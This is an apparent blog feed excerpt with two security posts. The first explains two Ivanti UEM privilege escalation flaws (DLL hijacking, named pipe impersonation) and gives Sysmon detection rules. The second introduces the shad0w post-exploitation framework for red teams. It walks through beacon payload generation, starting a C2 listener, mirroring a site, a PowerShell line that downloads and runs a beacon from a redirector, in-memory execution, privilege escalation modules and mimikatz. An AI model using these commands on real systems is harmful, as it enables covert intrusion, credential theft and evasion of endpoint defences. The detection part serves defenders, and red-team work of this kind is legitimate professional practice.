&lt;p&gt;In light of the recent vulnerabilities affecting Ivanti Unified Endpoint Manager we want to briefly touch on how it is possible to detect local privilege escalation attack, specifically addressing &lt;a href=&#34;https://labs.jumpsec.com/advisory-cve-2020-13770-ivanti-uem-named-pipe-token-impersonation/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2020-13770&lt;/a&gt; and &lt;a href=&#34;https://labs.jumpsec.com/advisory-cve-2020-13771-ivanti-uem-dll-hijacking/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2020-13771&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;You have probably heard of Sysmon already, but in case you have not, it is a handy tool available in the Windows Sysinternals toolsuite which can track, record and store detailed system events. These events can then be viewed within Windows Event Viewer, and are usually collected by SIEM software for aggregation and analysis.&lt;/p&gt;
&lt;p&gt;We’re focused on Sysmon in this writeup.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;In this section we give a brief explanation of the vulnerabilities and an example of Sysmon configuration rules to log exploitation attempts, along with the rationale behind them so you can adapt them to your existing configuration if needed. These will act as a solid first point of detection, and while the events thereby generated will be by themselves a confident indicator for malicious activity, they can be further correlated with other events for even more precise monitoring.&lt;/p&gt;
&lt;p&gt;CVE-2020-13771 - DLL search order hijacking&lt;/p&gt;
&lt;p&gt;To exploit this vulnerability a local attacker needs to create a malicious DLL library and place it in a particular path on the filesystem. This path is entirely dependent on the host configuration; the vulnerable software relies on Windows&amp;rsquo; &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#search-order-for-desktop-applications&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DLL Search Order for desktop applications&lt;/a&gt;, reported below, for locating and loading a DLL file.&lt;/p&gt;
&lt;p&gt;With SafeDllSearchMode enabled:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The directory from which the application loaded.&lt;/li&gt;
&lt;li&gt;The system directory. This is usually C:\Windows\System32\ and/or C:\Windows\SysWow64\ depending on the OS and process architecture.&lt;/li&gt;
&lt;li&gt;The 16-bit system directory. This is usually C:\Windows\System\&lt;/li&gt;
&lt;li&gt;The Windows directory. This is usually C:\Windows&lt;/li&gt;
&lt;li&gt;The process&amp;rsquo; current directory.&lt;/li&gt;
&lt;li&gt;The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;With SafeDllSearchMode disabled:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The directory from which the application loaded.&lt;/li&gt;
&lt;li&gt;The process&amp;rsquo; current directory.&lt;/li&gt;
&lt;li&gt;The system directory. This is usually C:\Windows\System32\ and/or C:\Windows\SysWow64\ depending on the OS and process architecture.&lt;/li&gt;
&lt;li&gt;The 16-bit system directory. This is usually C:\Windows\System\&lt;/li&gt;
&lt;li&gt;The Windows directory. This is usually C:\Windows&lt;/li&gt;
&lt;li&gt;The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SafeDllSearchMode is essentially a setting, enabled by default, which places the process&amp;rsquo; current directory later in the search order to try mitigate this type of vulnerabilities. Its value can be set to 1 (enabled) or 0 (disabled) in the following registry key:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In both circumstances the OS will look for a DLL file in the directories listed in the PATH environment variable, in the order as they appear, in case the library has not been not found yet. This variable needs particular attention, as it is easy to end up with directories writable by Everyone; moreover many software installers will silently append their directories to it.&lt;/p&gt;
&lt;p&gt;If a local attacker - or a remote one with an arbitrary filesystem write primitive - is able to place the malicious library in one of these paths, taking precedence over the path where the legitimate library is found - or regardless of precedence, if the legitimate library is not found at all - the file will be loaded by the vulnerable process, which will execute its DllMain function in its own context.&lt;/p&gt;
&lt;p&gt;Going back to the Ivanti Unified Endpoint Manager instance, the DLL files referenced in the advisory are not found by the processes, leaving the attacker a handful of possible paths to place his implant.&lt;/p&gt;
&lt;p&gt;To log exploitation attempts we can instruct Sysmon to record ImageLoad events; as the DLL file needs to have the precise filename the process is looking for, or else it will not be loaded, the filename is a good attribute to set filters on. Since legitimate libraries usually are signed by the software vendor or publisher, we can filter on this criteria to only log unsigned or untrusted images. The following rules will record library loading events on any process for all unsigned/untrusted libraries with these specific filenames, found anywhere in the filesystem:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Sysmon schemaversion=&amp;#34;4.22&amp;#34;&amp;gt;
    &amp;lt;EventFiltering&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;CVE-2020-13771&amp;#34; groupRelation=&amp;#34;and&amp;#34;&amp;gt;
            &amp;lt;ImageLoad onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;!-- Only log unsigned / invalid signature images --&amp;gt;
                &amp;lt;SignatureStatus condition=&amp;#34;is not&amp;#34;&amp;gt;Valid&amp;lt;/SignatureStatus&amp;gt;
                &amp;lt;!-- Only log these images --&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;ldprofileui.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;wfapi.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;DMIAPI32.DLL&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;logonsrv.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;ldprofileui.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;OOBCredentials.dll&amp;lt;/ImageLoaded&amp;gt;
            &amp;lt;/ImageLoad&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
    &amp;lt;/EventFiltering&amp;gt;
&amp;lt;/Sysmon&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/17330_dll_hijacking_event-1024x593.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;DLL Hijacking event captured by Sysmon. The image will show up as unsigned if the certificate is not trusted.&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;CVE-2020-13770 - Named pipe token impersonation&lt;/p&gt;
&lt;p&gt;This vulnerability is another classic in privilege escalation techniques; in fact, it is one of the methods meterpreter attempts when one runs &amp;ldquo;getsystem&amp;rdquo;. The issue takes place when a process opens a named pipe object without explicitly specifying proper security attributes. These security attributes can be specified when calling &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CreateFile&lt;/a&gt; on the &amp;ldquo;dwFlagsAndAttributes&amp;rdquo; parameter; among them, the following two are interesting from an attacker&amp;rsquo;s perspective:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SECURITY_DELEGATION - Impersonates a client at the Delegation impersonation level.&lt;/li&gt;
&lt;li&gt;SECURITY_IMPERSONATION - Impersonate a client at the impersonation level. This is the default behavior if no other flags are specified along with the SECURITY_SQOS_PRESENT flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first effectively allows for impersonation on remote hosts, while the second only allows that to happen locally. The problem relies on the fact that &amp;ldquo;SECURITY_IMPERSONATION&amp;rdquo; is the default value when no other attribute is specified, or when the &amp;ldquo;SECURITY_SQOS_PRESENT&amp;rdquo; flag is not set, which leads to this vulnerability being often introduced unwarily.&lt;/p&gt;
&lt;p&gt;Upon opening a named pipe with one of these two security attributes, the server has the access to obtain the client&amp;rsquo;s token and use it during subsequent access checks; in cases where the client has higher privileges than the server, the server would effectively obtain elevation of privileges. Any process can open a new named pipe object, granted that one with the same name does not already exist, although the impersonation process requires the server process to hold the SeImpersonatePrivilege privilege. By default this is assigned to service users, such as &amp;ldquo;nt authority\network service&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;A further requirement for the privilege escalation process is that the client must write some data to the named pipe before the impersonation process can take place. It is therefore possible for a process to open the pipe with insecure security attributes but not be exploitable to achieve EoP.&lt;/p&gt;
&lt;p&gt;With regards to detecting exploitation on Unified Endpoint Manager, having identified on which named pipe object the impersonation takes place, pipe creation events can be filtered on their name. Any process other than the legitimate pipe servers can be appended to the exclude rules to be filtered out. Since the pipe is specific to Ivanti software, such a configuration will be effective in giving no false positive. Further events can optionally be correlated to the one targeted here, such as process creations or file operation performed by the same process creating the named pipe object. Note that the exclude rule might need to be edited to the reader&amp;rsquo;s version of SQL Server.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Sysmon schemaversion=&amp;#34;4.22&amp;#34;&amp;gt;
    &amp;lt;EventFiltering&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;CVE-2020-13770&amp;#34; groupRelation=&amp;#34;and&amp;#34;&amp;gt;
            &amp;lt;PipeEvent onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;!-- Monitor CreatePipe events --&amp;gt;
                &amp;lt;EventType condition=&amp;#34;is&amp;#34;&amp;gt;CreatePipe&amp;lt;/EventType&amp;gt;
                &amp;lt;!-- Only log these named pipes --&amp;gt;
                &amp;lt;PipeName condition=&amp;#34;is&amp;#34;&amp;gt;\SQLLocal\ldmsdata&amp;lt;/PipeName&amp;gt;
            &amp;lt;/PipeEvent&amp;gt;
            &amp;lt;PipeEvent onmatch=&amp;#34;exclude&amp;#34;&amp;gt;
                &amp;lt;!-- Only log if the pipe is not created by these (legitimate) processes --&amp;gt;
                &amp;lt;Image condition=&amp;#34;is&amp;#34;&amp;gt;C:\Program Files\Microsoft SQL Server\MSSQL13.LDMSDATA\MSSQL\Binn\sqlservr.exe&amp;lt;/Image&amp;gt;
            &amp;lt;/PipeEvent&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
    &amp;lt;/EventFiltering&amp;gt;
&amp;lt;/Sysmon&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/17330_named_pipe-1024x609.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;CreatePipe event captured by Sysmon.&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;

      </description>
    </item>
    
    <item>
      <title>shad0w</title>
      <link>//localhost:1313/articles/2020/06/2020-06-03-shad0w/</link>
      <pubDate>Wed, 03 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/06/2020-06-03-shad0w/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/bats3c/shad0w&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;This project can be found on github&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Post exploitation is large part of a red team engagement. While many organisations begin to mature and start to deploy a range of sophisticated Endpoint Detection &amp;amp; Response solutions (EDR) onto their networks, it requires us, as attackers to also mature. We need to upgrade our arsenal to give us the capabilities to successfully operate on their networks. That is why today, I am releasing shad0w.&lt;/p&gt;
&lt;p&gt;shad0w is a post exploitation framework which is designed to operate covertly on such networks, providing the operator with much greater control over their engagements. Over future blog posts I will go into greater detail on the intricacies of how shad0w works. This blog post will, therefore, serve as an introduction into the usage and features that shad0w has to offer.&lt;/p&gt;
&lt;h2&gt;Overview &amp;amp; Install&lt;span class=&#34;absolute -mt-20&#34; id=&#34;overview--install&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#overview--install&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;shad0w is designed to be run inside docker, this is to make life easier for the operator as it has some very specific dependencies which are required for it to work correctly. Installation is very simple, just requiring the two commands shown below.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/bats3c/shad0w.git &amp;amp;&amp;amp; cd shad0w
$ sudo ./shad0w install&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;Getting a foothold&lt;span class=&#34;absolute -mt-20&#34; id=&#34;getting-a-foothold&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#getting-a-foothold&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;shad0w implants are called beacons. There are two types of beacons: secure and insecure. Secure beacons are designed to operate in environments where it is vital to remain undetected whereas insecure beacons are for environments where the security is much more relaxed.&lt;/p&gt;
&lt;p&gt;Currently there are 3 different formats for beacons: exe, shellcode and powershell. The shellcode and powershell formats allow for shad0w to be used in completely fileless attacks allowing everything to be run entirely inside memory.&lt;/p&gt;
&lt;p&gt;To generate such a payload you can use the command shown below, this will place the payload of a statically linked secure beacon in &lt;code&gt;beacon.ps1&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ shad0w beacon -p x64/windows/secure/static -H your.redirector -f psh -o beacon.ps1&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The next steps would be to start the C2 server. When starting the C2 it will need to be given the address that the beacon will connect to. So if you are using redirectors it would not be the address of the C2 but rather the address of your first redirector. The command for starting a C2 instance for the beacons to callback to is shown below&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ shad0w listen -e your.redirector&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;A feature which could also be useful is the C2 servers ability to live proxy and essentially clone a website. This feature can be used with the &lt;code&gt;--mirror&lt;/code&gt; or &lt;code&gt;-m&lt;/code&gt; flag. This example would mirror the site &lt;a href=&#34;https://www.bbc.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.bbc.com/&lt;/a&gt; to the address of your redirector &lt;a href=&#34;https://your.redirector/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://your.redirector/&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ shad0w listen -e your.redirector -m &amp;#34;https://www.bbc.com/&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;So then when you visit your redirector you are given &lt;a href=&#34;https://www.bbc.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.bbc.com/&lt;/a&gt;. This will also proxy any links you click or files you download which are on the site you have mirrored.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/mirror2.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/mirror3-1024x557.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now that your C2 is up and running you can execute the beacon. I will use an example of how you can do so with powershell but due to the beacon being in shellcode form, you can quite easily execute the beacon from many other languages.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;PS&amp;gt; IEX (New-Object System.Net.WebClient).DownloadString(&amp;#34;https://another.redirector/beacon.ps1&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And we get a callback&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/catch_session_resize.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Enumeration&lt;span class=&#34;absolute -mt-20&#34; id=&#34;enumeration&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#enumeration&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now that we have a active session on the machine we can interact with it via the &lt;code&gt;beacons&lt;/code&gt; command.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;shad0w ≫ beacons -i 1&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;shad0w has some useful commands that can be used to explore and interact with the local file system e.g &lt;code&gt;ls cd pwd rm cat mkdir&lt;/code&gt; while also letting you &lt;code&gt;upload&lt;/code&gt; and &lt;code&gt;download&lt;/code&gt; files.&lt;/p&gt;
&lt;p&gt;One of the most useful features of shad0w is that it allows you to execute any .NET assembly, EXE, DLL, VBS, JS or XSL file in memory on the target without anything touching disk. For example to execute the .NET assembly &lt;code&gt;seatbelt.exe&lt;/code&gt; in memory you can use the &lt;code&gt;execute&lt;/code&gt; command, giving the file name with the &lt;code&gt;-f&lt;/code&gt; flag and any arguments with the &lt;code&gt;-p&lt;/code&gt; flag&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;shad0w ≫ execute -f seatbelt.exe -p all&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;All the output from the command will be sent back to your terminal window&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/execute_resize.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Privilege Escalation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;privilege-escalation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#privilege-escalation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;I have designed shad0w to be very modular, allowing operators to create and use their own modules. I have kept this philosophy in mind when making the &lt;code&gt;elevate&lt;/code&gt; command. I designed it to help elevate the current beacons privileges by using common privilege escalation techniques &amp;amp; exploits all of which are stored in easy to use modules, allowing an operator to create new or build on existing modules easily.&lt;/p&gt;
&lt;p&gt;To list the available privesc modules for the current session you can use the &lt;code&gt;--list&lt;/code&gt; or &lt;code&gt;-l&lt;/code&gt; flag&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;shad0w ≫ elevate --list&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Modules come in two different modes, check and exploit. To run a modules in check mode use the &lt;code&gt;--check&lt;/code&gt; or &lt;code&gt;-c&lt;/code&gt; flags and to use a module in exploit mode use the &lt;code&gt;--use&lt;/code&gt; or &lt;code&gt;-u&lt;/code&gt; flags.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;shad0w ≫ elevate --check system_printspoofer
shad0w ≫ elevate --use system_printspoofer&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;If an exploit is successful you will receive a new session from a beacon with elevate privileges&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/elevate_resize.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Modules&lt;span class=&#34;absolute -mt-20&#34; id=&#34;modules&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#modules&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As I previously said, shad0w is designed to be very modular making the creation of new modules not much of a challenge. To showcase this I&amp;rsquo;ve added a mimikatz module. It will be executed inside memory like any module you decide to run but it should never be run over a secure beacon. This is because by design mimikatz is not very operationally secure so any half decent EDR should catch it very quickly. It is very much a welcome addition to the insecure beacons though.&lt;/p&gt;
